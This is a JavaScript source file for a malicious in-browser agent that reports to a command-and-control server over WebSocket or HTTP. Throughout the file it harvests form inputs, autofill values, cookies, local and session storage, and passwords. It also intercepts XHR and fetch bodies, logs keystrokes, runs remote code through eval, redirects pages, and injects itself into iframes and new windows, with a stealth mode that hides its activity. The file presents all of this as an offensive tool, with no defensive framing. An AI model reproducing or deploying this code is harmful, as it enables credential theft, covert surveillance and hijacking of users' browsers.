/**
 * BROWSER AGENT - JavaScript agent for XSS/extension propagation.
 * Runs in browser context, communicates with C2 via WebSocket/HTTP.
 * 
 * Capabilities:
 * - Credential harvesting (forms, autofill)
 * - Cookie theft
 * - Browser history
 * - Keylogging (page-level)
 * - Screenshot (canvas)
 * - XSS propagation
 * - Extension injection
 */

(function() {
    'use strict';
    
    // ─── CONFIGURATION ───────────────────────────────────────────────────────
    
    const CONFIG = {
        C2_URL: window.C2_URL || 'http://127.0.0.1:5000',
        WS_URL: window.WS_URL || 'ws://127.0.0.1:5000/ws',
        BEACON_INTERVAL: 30000,  // 30 seconds
        HEARTBEAT_INTERVAL: 60000,  // 1 minute
        EXFIL_CHUNK_SIZE: 100,
        STEALTH_MODE: true,
    };
    
    // Agent ID (persistent via localStorage)
    let AGENT_ID = localStorage.getItem('_sys_agent_id');
    if (!AGENT_ID) {
        AGENT_ID = 'br_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
        localStorage.setItem('_sys_agent_id', AGENT_ID);
    }
    
    // State
    const STATE = {
        connected: false,
        last_beacon: 0,
        key_buffer: [],
        forms_collected: false,
        cookies_collected: false,
        history_collected: false,
    };
    
    // ─── UTILITY FUNCTIONS ───────────────────────────────────────────────────
    
    function log(msg) {
        if (!CONFIG.STEALTH_MODE) console.log('[BrowserAgent]', msg);
    }
    
    function encode(data) {
        return btoa(encodeURIComponent(JSON.stringify(data)));
    }
    
    function decode(str) {
        try {
            return JSON.parse(decodeURIComponent(atob(str)));
        } catch {
            return null;
        }
    }
    
    function getRandomDelay(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }
    
    // ─── HTTP COMMUNICATION ─────────────────────────────────────────────────
    
    async function httpPost(endpoint, data) {
        try {
            const response = await fetch(CONFIG.C2_URL + endpoint, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Agent-ID': AGENT_ID,
                },
                body: JSON.stringify(data),
                credentials: 'include',
            });
            return await response.json();
        } catch (e) {
            log('HTTP error: ' + e.message);
            return null;
        }
    }
    
    async function httpGet(endpoint) {
        try {
            const response = await fetch(CONFIG.C2_URL + endpoint, {
                method: 'GET',
                headers: {
                    'X-Agent-ID': AGENT_ID,
                },
                credentials: 'include',
            });
            return await response.json();
        } catch (e) {
            log('HTTP error: ' + e.message);
            return null;
        }
    }
    
    // ─── WEBSOCKET COMMUNICATION ───────────────────────────────────────────
    
    let ws = null;
    let wsReconnectTimer = null;
    
    function connectWebSocket() {
        if (ws && ws.readyState === WebSocket.OPEN) return;
        
        try {
            ws = new WebSocket(CONFIG.WS_URL);
            
            ws.onopen = () => {
                log('WebSocket connected');
                STATE.connected = true;
                
                // Register agent
                ws.send(JSON.stringify({
                    type: 'register',
                    agent_id: AGENT_ID,
                    platform: 'browser',
                    url: window.location.href,
                    user_agent: navigator.userAgent,
                }));
            };
            
            ws.onmessage = (event) => {
                handleCommand(JSON.parse(event.data));
            };
            
            ws.onclose = () => {
                STATE.connected = false;
                log('WebSocket closed, reconnecting...');
                
                // Reconnect with delay
                clearTimeout(wsReconnectTimer);
                wsReconnectTimer = setTimeout(connectWebSocket, getRandomDelay(5000, 15000));
            };
            
            ws.onerror = (e) => {
                log('WebSocket error');
            };
        } catch (e) {
            log('WebSocket connect error: ' + e.message);
        }
    }
    
    function wsSend(data) {
        if (ws && ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify(data));
        }
    }
    
    // ─── CREDENTIAL HARVESTING ─────────────────────────────────────────────
    
    function harvestForms() {
        const forms = [];
        
        // Get all forms
        document.querySelectorAll('form').forEach(form => {
            const formData = {
                action: form.action || window.location.href,
                method: form.method || 'GET',
                inputs: [],
            };
            
            form.querySelectorAll('input, textarea, select').forEach(input => {
                if (input.type && ['password', 'hidden', 'text', 'email', 'tel', 'number'].includes(input.type.toLowerCase())) {
                    formData.inputs.push({
                        name: input.name || input.id,
                        type: input.type,
                        value: input.value,
                        id: input.id,
                    });
                }
            });
            
            if (formData.inputs.length > 0) {
                forms.push(formData);
            }
        });
        
        // Get standalone inputs (not in forms)
        document.querySelectorAll('input:not(form input)').forEach(input => {
            if (['password', 'text', 'email', 'tel'].includes(input.type.toLowerCase())) {
                forms.push({
                    action: window.location.href,
                    method: 'STANDALONE',
                    inputs: [{
                        name: input.name || input.id,
                        type: input.type,
                        value: input.value,
                    }],
                });
            }
        });
        
        return forms;
    }
    
    function harvestAutofill() {
        // Try to trigger autofill and capture values
        const autofill = [];
        
        document.querySelectorAll('input[autocomplete]').forEach(input => {
            if (input.value) {
                autofill.push({
                    name: input.name || input.id,
                    autocomplete: input.getAttribute('autocomplete'),
                    value: input.value,
                    type: input.type,
                });
            }
        });
        
        return autofill;
    }
    
    function setupFormInterceptor() {
        // Intercept form submissions
        document.querySelectorAll('form').forEach(form => {
            form.addEventListener('submit', (e) => {
                const formData = new FormData(form);
                const data = {
                    type: 'form_submit',
                    url: window.location.href,
                    action: form.action,
                    method: form.method,
                    data: Object.fromEntries(formData),
                    timestamp: Date.now(),
                };
                
                // Send to C2
                exfilData('forms', data);
            }, true);  // Capture phase
        });
        
        // Intercept AJAX requests
        const originalXHROpen = XMLHttpRequest.prototype.open;
        const originalXHRSend = XMLHttpRequest.prototype.send;
        
        XMLHttpRequest.prototype.open = function(method, url, ...args) {
            this._url = url;
            this._method = method;
            return originalXHROpen.apply(this, [method, url, ...args]);
        };
        
        XMLHttpRequest.prototype.send = function(body) {
            if (body && this._url) {
                try {
                    // Try to parse as form data or JSON
                    let data = body;
                    if (typeof body === 'string') {
                        try { data = JSON.parse(body); } catch {}
                    } else if (body instanceof FormData) {
                        data = Object.fromEntries(body);
                    }
                    
                    exfilData('ajax', {
                        url: this._url,
                        method: this._method,
                        data: data,
                    });
                } catch {}
            }
            return originalXHRSend.apply(this, [body]);
        };
        
        // Intercept fetch
        const originalFetch = window.fetch;
        window.fetch = function(url, options = {}) {
            if (options.body) {
                exfilData('fetch', {
                    url: url,
                    method: options.method || 'GET',
                    data: options.body,
                });
            }
            return originalFetch.apply(this, [url, options]);
        };
    }
    
    // ─── COOKIE HARVESTING ────────────────────────────────────────────────
    
    function harvestCookies() {
        const cookies = [];
        
        // Get accessible cookies
        document.cookie.split(';').forEach(cookie => {
            const [name, value] = cookie.trim().split('=');
            if (name) {
                cookies.push({
                    name: name,
                    value: value || '',
                    domain: window.location.hostname,
                    path: '/',
                });
            }
        });
        
        return cookies;
    }
    
    function harvestLocalStorage() {
        const storage = [];
        
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            if (!key.startsWith('_sys_')) {  // Skip our own data
                storage.push({
                    key: key,
                    value: localStorage.getItem(key),
                });
            }
        }
        
        return storage;
    }
    
    function harvestSessionStorage() {
        const storage = [];
        
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            storage.push({
                key: key,
                value: sessionStorage.getItem(key),
            });
        }
        
        return storage;
    }
    
    // ─── BROWSER HISTORY ──────────────────────────────────────────────────
    
    async function harvestHistory() {
        // Can't directly access history, but can infer from:
        // - Performance API
        // - Visited links (CSS)
        
        const history = {
            current: window.location.href,
            referrer: document.referrer,
            length: window.history.length,
            performance: [],
        };
        
        // Performance timing entries
        try {
            const entries = performance.getEntriesByType('navigation');
            entries.forEach(entry => {
                history.performance.push({
                    type: entry.type,
                    duration: entry.duration,
                });
            });
            
            // Resource entries (visited resources)
            performance.getEntriesByType('resource').forEach(entry => {
                history.performance.push({
                    name: entry.name,
                    type: entry.initiatorType,
                });
            });
        } catch {}
        
        return history;
    }
    
    // ─── KEYLOGGING ───────────────────────────────────────────────────────
    
    function setupKeylogger() {
        document.addEventListener('keydown', (e) => {
            const keyData = {
                key: e.key,
                code: e.code,
                target: e.target.tagName + (e.target.name ? ':' + e.target.name : ''),
                type: e.type,
                timestamp: Date.now(),
            };
            
            STATE.key_buffer.push(keyData);
            
            // Flush buffer periodically
            if (STATE.key_buffer.length >= CONFIG.EXFIL_CHUNK_SIZE) {
                flushKeyBuffer();
            }
        }, true);
    }
    
    function flushKeyBuffer() {
        if (STATE.key_buffer.length === 0) return;
        
        exfilData('keystrokes', {
            keys: STATE.key_buffer,
            url: window.location.href,
        });
        
        STATE.key_buffer = [];
    }
    
    // ─── SCREENSHOT ───────────────────────────────────────────────────────
    
    async function captureScreenshot() {
        try {
            // Use html2canvas if available, otherwise basic canvas
            if (typeof html2canvas !== 'undefined') {
                const canvas = await html2canvas(document.body);
                return canvas.toDataURL('image/jpeg', 0.7);
            }
            
            // Basic canvas screenshot (limited)
            const canvas = document.createElement('canvas');
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            const ctx = canvas.getContext('2d');
            
            // Draw background color
            ctx.fillStyle = window.getComputedStyle(document.body).backgroundColor;
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            
            // Note: Can't capture actual content without html2canvas
            return canvas.toDataURL('image/jpeg', 0.7);
        } catch (e) {
            return null;
        }
    }
    
    // ─── XSS PROPAGATION ─────────────────────────────────────────────────
    
    function injectXSS() {
        // Inject agent into iframes
        document.querySelectorAll('iframe').forEach(iframe => {
            try {
                const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                if (iframeDoc) {
                    injectIntoDocument(iframeDoc);
                }
            } catch (e) {
                // Cross-origin iframe
            }
        });
        
        // Inject into new windows
        const originalOpen = window.open;
        window.open = function(url, name, specs) {
            const win = originalOpen.apply(this, [url, name, specs]);
            if (win) {
                try {
                    setTimeout(() => {
                        injectIntoDocument(win.document);
                    }, 1000);
                } catch {}
            }
            return win;
        };
    }
    
    function injectIntoDocument(doc) {
        const script = doc.createElement('script');
        script.textContent = '(' + getAgentCode() + ')();';
        
        try {
            (doc.head || doc.documentElement).appendChild(script);
        } catch {}
    }
    
    function getAgentCode() {
        // Return the agent code as a string for injection
        return arguments.callee.toString();
    }
    
    // ─── DATA EXFILTRATION ───────────────────────────────────────────────
    
    async function exfilData(type, data) {
        const payload = {
            agent_id: AGENT_ID,
            type: type,
            data: data,
            url: window.location.href,
            timestamp: Date.now(),
        };
        
        // Try WebSocket first
        if (STATE.connected) {
            wsSend({
                type: 'exfil',
                payload: payload,
            });
        } else {
            // Fallback to HTTP
            await httpPost('/api/browser/exfil', payload);
        }
    }
    
    // ─── COMMAND HANDLING ────────────────────────────────────────────────
    
    async function handleCommand(cmd) {
        log('Command: ' + cmd.type);
        
        switch (cmd.type) {
            case 'ping':
                wsSend({ type: 'pong', agent_id: AGENT_ID });
                break;
                
            case 'harvest':
                const data = await harvestAll();
                wsSend({ type: 'harvest_result', data: data });
                break;
                
            case 'screenshot':
                const screenshot = await captureScreenshot();
                wsSend({ type: 'screenshot', data: screenshot });
                break;
                
            case 'execute':
                try {
                    const result = eval(cmd.code);
                    wsSend({ type: 'execute_result', result: String(result) });
                } catch (e) {
                    wsSend({ type: 'execute_result', error: e.message });
                }
                break;
                
            case 'redirect':
                window.location.href = cmd.url;
                break;
                
            case 'inject':
                injectXSS();
                break;
                
            case 'forms':
                const forms = harvestForms();
                wsSend({ type: 'forms_result', forms: forms });
                break;
                
            case 'cookies':
                const cookies = harvestCookies();
                wsSend({ type: 'cookies_result', cookies: cookies });
                break;
                
            case 'storage':
                const storage = {
                    local: harvestLocalStorage(),
                    session: harvestSessionStorage(),
                };
                wsSend({ type: 'storage_result', storage: storage });
                break;
                
            case 'keylog_flush':
                flushKeyBuffer();
                break;
                
            case 'steal':
                // Steal specific data
                if (cmd.target === 'passwords') {
                    const pwInputs = document.querySelectorAll('input[type="password"]');
                    const passwords = Array.from(pwInputs).map(i => ({
                        name: i.name,
                        value: i.value,
                        form: i.form ? i.form.action : null,
                    }));
                    wsSend({ type: 'passwords_result', passwords: passwords });
                }
                break;
        }
    }
    
    // ─── HARVEST ALL ──────────────────────────────────────────────────────
    
    async function harvestAll() {
        return {
            url: window.location.href,
            title: document.title,
            referrer: document.referrer,
            forms: harvestForms(),
            autofill: harvestAutofill(),
            cookies: harvestCookies(),
            localStorage: harvestLocalStorage(),
            sessionStorage: harvestSessionStorage(),
            history: await harvestHistory(),
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            cookiesEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,
            screenWidth: screen.width,
            screenHeight: screen.height,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        };
    }
    
    // ─── BEACON ───────────────────────────────────────────────────────────
    
    async function sendBeacon() {
        const now = Date.now();
        if (now - STATE.last_beacon < CONFIG.BEACON_INTERVAL) return;
        STATE.last_beacon = now;
        
        const beacon = {
            agent_id: AGENT_ID,
            type: 'beacon',
            url: window.location.href,
            title: document.title,
            timestamp: now,
        };
        
        if (STATE.connected) {
            wsSend(beacon);
        } else {
            await httpPost('/api/browser/beacon', beacon);
        }
    }
    
    // ─── INITIALIZATION ───────────────────────────────────────────────────
    
    function init() {
        log('Initializing Browser Agent: ' + AGENT_ID);
        
        // Setup interceptors
        setupFormInterceptor();
        setupKeylogger();
        
        // Connect to C2
        connectWebSocket();
        
        // Periodic beacon
        setInterval(sendBeacon, CONFIG.BEACON_INTERVAL);
        
        // Periodic key buffer flush
        setInterval(flushKeyBuffer, CONFIG.BEACON_INTERVAL);
        
        // Initial harvest
        setTimeout(async () => {
            const data = await harvestAll();
            exfilData('initial', data);
        }, getRandomDelay(1000, 5000));
        
        // XSS propagation
        setTimeout(injectXSS, getRandomDelay(5000, 15000));
        
        log('Browser Agent initialized');
    }
    
    // ─── START ────────────────────────────────────────────────────────────
    
    // Wait for DOM ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
    
    // Also expose for manual injection
    window.BrowserAgent = {
        harvest: harvestAll,
        screenshot: captureScreenshot,
        exfil: exfilData,
        getAgentId: () => AGENT_ID,
    };
    
})();
